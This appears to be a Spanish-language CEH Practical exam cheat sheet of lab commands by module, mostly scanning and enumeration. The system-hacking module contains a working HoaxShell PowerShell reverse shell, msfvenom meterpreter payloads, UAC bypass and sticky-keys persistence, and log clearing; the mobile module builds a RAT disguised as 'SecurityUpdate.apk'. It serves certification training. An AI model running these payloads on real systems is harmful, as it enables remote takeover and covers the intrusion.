# CEH Practical – Cheat Sheet de Comandos por Módulo

---

## Módulo 02 – Footprinting & Reconnaissance

**DNS / WHOIS**
```
nslookup
  set type=a
  <dominio>
  set type=cname
  <dominio>
  <nameserver>
```

**Traceroute**
```
tracert www.dominio.com
tracert -h 5 www.dominio.com          # Windows, limita saltos
traceroute www.dominio.com            # Linux
```

**OSINT / redes sociales**
```
sherlock "Nombre Apellido"            # busca usuario en redes sociales
```

**Recon-ng (framework de reconocimiento)**
```
sudo su
recon-ng
  help
  marketplace install all
  modules search
  workspaces create CEH
  db insert domains          # o similar, según el módulo cargado
  modules load recon/hosts-hosts/reverse_resolve
  run
  show hosts
  modules load reporting/html
  options set CREATOR ...
  options set CUSTOMER ...
  run
```

**Módulos Recon-ng útiles**
```
modules load recon/domains-contacts/whois_pocs
options set SOURCE <dominio>
run

modules load recon/domains-hosts/hackertarget
options set SOURCE <dominio>
run
```

**ShellGPT (sgpt) — asistente de terminal usado en varios labs**
```
bash sgpt.sh                          # configurar la primera vez
sgpt --chat footprint --shell "Use theHarvester to gather emails of <dominio>"
sgpt --chat footprint --shell "Use Sherlock to gather info about '<nombre>' and save in recon2.txt"
sgpt --chat footprint --shell "Install and use DNSRecon to perform DNS enumeration on <dominio>"
sgpt --chat footprint --shell "Perform network traceroute to discover routers to <host>"
```

---

## Módulo 03 – Scanning Networks

**Descubrimiento de hosts (ping scans)**
```
nmap -sn -PR [IP]        # ARP ping
nmap -sn -PU [IP]        # UDP ping
nmap -sn -PE [IP]        # ICMP ECHO ping
nmap -sn -PE [rango IP]  # ping sweep, ej 10.10.1.10-23
nmap -sn -PP [IP]        # ICMP timestamp ping
```

**Técnicas de escaneo de puertos**
```
nmap -sT -v [IP]         # TCP connect scan
nmap -sS -v [IP]         # Stealth/SYN scan
nmap -sX -v [IP]         # XMAS scan
nmap -sM -v [IP]         # Maimon scan
nmap -sA -v [IP]         # ACK flag scan
nmap -sU -v [IP]         # UDP scan
nmap -sV [IP]            # Version detection
```

**OS discovery**
```
nmap -A [IP]                              # scan agresivo
nmap -O [IP]                              # detección de OS
nmap --script smb-os-discovery.nse [IP]   # OS vía SMB
```

**Evasión de IDS/Firewall**
```
nmap -f [IP]              # fragmentación de paquetes
nmap -g 80 [IP]           # manipulación de puerto origen
nmap -mtu 8 [IP]          # MTU custom
nmap -D RND:10 [IP]       # decoys aleatorios
```

**Escaneo con Metasploit**
```
msfconsole
  search portscan
  use auxiliary/scanner/portscan/syn
  set RHOSTS [IP]
  show options
  run
```

**hping3**
```
hping3 [IP] -c 100000                 # flood/prueba
# vía sgpt: "Run a hping3 ACK scan on port 80 of target IP ..."
```

---

## Módulo 04 – Enumeration

**NetBIOS**
```
nbtstat -a [IP remota]
nbtstat -c
net use
```

**SNMP**
```
snmpwalk -v1 -c public [IP]
snmpwalk -v2c -c public [IP]
```

**NFS**
```
nmap -p 2049 [IP]
showmount -e [IP]
```

**SMTP**
```
nmap -p 25 --script=smtp-enum-users [IP]
nmap -p 25 --script=smtp-open-relay [IP]
nmap -p 25 --script=smtp-commands [IP]
```

**DNS**
```
dig ns [dominio]
```

**RPC**
```
cd RPCScan
python3 rpc-scan.py [IP] --rpc
```

**SuperEnum (script todo-en-uno)**
```
cd SuperEnum
./superenum
```

**Vía sgpt (ejemplos usados en el lab)**
```
sgpt --shell "Perform NetBIOS enumeration on target IP ..."
sgpt --shell "Perform IPsec enumeration on target IP ... with Nmap"
sgpt --shell "Scan the target IP ... for SMB port with Nmap"
sgpt --shell "Use nmap script to perform ldap-brute-force on IP ..."
sgpt --shell "Use Nmap to perform FTP Enumeration on ..."
```

---

## Módulo 05 – Vulnerability Analysis

```
docker run -d -p 443:443 --name openvas mikesplain/openvas   # levantar OpenVAS
nikto -h [IP o URL]                                           # (Ctrl+Z para pausar, revisar resultados)
sgpt --chat vuln --shell "Perform vulnerability scan on target url ... with Nmap"
```

---

## Módulo 06 – System Hacking

**Captura de hashes / cracking**
```
sudo responder -I eth0          # envenenamiento LLMNR/NBT-NS
john hash.txt                   # crackeo de hash
```
sudo docker run -d -p 80:80 reverse_shell_generator
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe -o reverse.exe

msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 4444; exploit"
getuid

HoaxShell
Powershell IEX 
$s='10.10.1.13:444';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}

oaxshell
sudo python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t ps-iex -p 444


**Reverse shell / netcat**
```
nc -nvlp 4444                   # listener en atacante
nc -nv [IP] 9999                # conexión saliente
```

**Buffer overflow (patrón típico del lab)**
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400
./findoff.py
./overwrite.py
./badchars.py
python3 /home/attacker/converter.py
./jump.py
./shellcode.py
```

**Servidor web para compartir payloads**
```
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
service apache2 start
```

**Post-explotación / limpieza de huellas**
```
msfconsole
  sysinfo
  shell
    whoami
    exit

wevtutil el                     # listar logs (Windows)
wevtutil cl [log_name]          # limpiar log específico
cipher /w:[Ruta]                # borrado seguro de espacio libre

# Linux - limpiar historial
export HISTSIZE=0
history -c
```

**Escaneo rápido de red interna**
```
nmap 10.10.1.0/24
nmap -A -sC -sV [IP]
```
```
**Task : Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys**
```
Run mkdir /var/www/html/share command to create a shared folder
Run chmod -R 755 /var/www/html/share command
Run chown -R www-data:www-data /var/www/html/share command


 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
 cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
service apache2 start
msfconsole
use exploit/multi/handle
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.1.13
set lport 444
run

sysinfo
getuid
background
search bypassuac
use exploit/windows/local/bypassuac_fodhelper
set session 1
show options
set LHOST 10.10.1.13
 set TARGET 0
exploit
getsystem -t 1 
getuid
background
post/windows/manage/sticky_keys
sessions -i*
set session 2
exploit  
```

```

---

## Módulo 07 – Malware Threats
Los labs de este módulo son mayormente basados en GUI (crear/analizar malware con herramientas visuales, sandboxing). No se identificaron comandos CLI adicionales fuera de los ya cubiertos en Módulo 06 (msfvenom, listeners netcat).

---

## Módulo 08 – Sniffing
```
hping3 [IP] -c 100000            # generar tráfico para capturar
```
Wireshark se usa principalmente por GUI: capturar interfaz → aplicar filtros de display (ej. `http`, `tcp.port==21`, `arp`).

---

## Módulo 09 – Social Engineering
Lab principalmente GUI (creación de campañas de phishing, uso de herramientas de ingeniería social). No se identificaron comandos CLI específicos.

---

## Módulo 10 – Denial-of-Service
```
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share/
chown -R www-data:www-data /var/www/html/share/
# en Metasploit/sesión: upload /home/attacker/Downloads/eagle-dos.py, luego "run shell"
```

---

## Módulo 11 – Session Hijacking
```
ipconfig /flushdns               # limpiar cache DNS (Windows)
```
Resto del módulo es principalmente Wireshark GUI para captura/análisis de sesión.

---

## Módulo 12 – Evading IDS, Firewalls y Honeypots
```
cd C:\Snort\bin
snort -W                         # listar interfaces
snort ...                        # ejecutar Snort con config (ver detalles del lab)
ping google.com
nmap -p- -sV [IP]
whoami
ls -la
tail cowrie.log                  # revisar logs del honeypot Cowrie
service apache2 start
```

---

## Módulo 13 – Hacking Web Servers
```
nmap -sV -sC [IP]
searchsploit -t Apache RCE

sgpt --shell "Perform a directory traversal on target url ... using gobuster"
sgpt --shell "Perform webserver footprinting on target IP ..."
sgpt --shell "Mirror the target website ... with httrack"
```

---

## Módulo 14 – Hacking Web Applications
```
nmap -T4 -A -v [URL objetivo]

# Wapiti
cd wapiti
python3 -m venv wapiti3
. wapiti3/bin/activate
pip install .
wapiti -u https://<objetivo>
cp <reporte>.html /home/attacker/
firefox <reporte>.html

# vía sgpt
sgpt --shell "Check if the target url ... has web application firewall"
sgpt --shell "Perform vulnerability scan on target url ... using nmap"
sgpt --shell "Scan the web content of target url ... using Dirb"
sgpt --shell "Scan the web content of target url ... using Gobuster"
sgpt --shell "Fuzz the target url ... using Wfuzz"
```

---

## Módulo 15 – Inyección SQL
```
sqlmap -u "http://<url>/page?id=1" --dbs
sqlmap -u "http://<url>/page?id=1" -D <db> --tables
sqlmap -u "http://<url>/page?id=1" -D <db> -T <tabla> --dump
```
(El lab en español usa principalmente sqlmap y sgpt para automatizar los pasos; ver el módulo para las variantes exactas usadas con `--batch`, `--level`, `--risk` si aparecen en tu simulador.)

---

## Módulo 16 – Hacking Wireless Networks
```
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a [BSSID] wlan0mon
aircrack-ng -w wordlist.txt captura.cap
```
Wireshark en modo monitor se usa para capturar y analizar tráfico 802.11 (revisar cabecera Radiotap).

---

## Módulo 17 – Hacking Mobile Platforms
```
cd PhoneSploit-Pro
python3 phonesploitpro.py

cd AndroRAT
python3 androRAT.py --build -i [IP atacante] -p 4444 -o SecurityUpdate.apk
cp SecurityUpdate.apk /var/www/html/share/
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
service apache2 start
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
```

---

## Módulo 18 – IoT & OT Hacking
```
cd ICSim
make
```
(Simulador de bus CAN para prácticas IoT/OT; resto del lab es GUI con herramientas específicas de IoT.)

---

## Módulo 19 – Cloud Computing
```
cd C:\Users\Admin\Desktop\AADInternals
Install-Module AADInternals
Import-Module AADInternals
```
(PowerShell — enumeración/explotación de Azure AD.)

---

## Módulo 20 – Cryptography
```
sgpt --shell "Calculate MD5 hash of text '<texto>'"
sgpt --chat hash --shell "Calculate CRC32 hash of the file passwords.txt"
```
Resto del módulo usa herramientas GUI (HashCalc, CrypTool, MD5 Calculator) para hashing/cifrado/esteganografía.

---

## Notas generales para el examen
- En el Practical NO se evalúa teoría: cada reto es "ejecuta X para lograr Y en la IP dada". Practica sobre todo **nmap** (flags de escaneo/evasión), **enumeración de servicios** (SMB, SNMP, SMTP, NFS, RPC) y **sqlmap**.
- Los labs oficiales usan mucho **ShellGPT (sgpt)** para generar comandos — en el examen real probablemente no tengas esa muleta, así que memoriza el comando nativo detrás de cada prompt de sgpt (están listados arriba).
- Máquinas objetivo típicas: `10.10.1.11` (Win11), `10.10.1.22` (Win Server 2022), `10.10.1.19`, `10.10.1.9` — en el examen serán otras IPs, pero el patrón de comandos es el mismo.
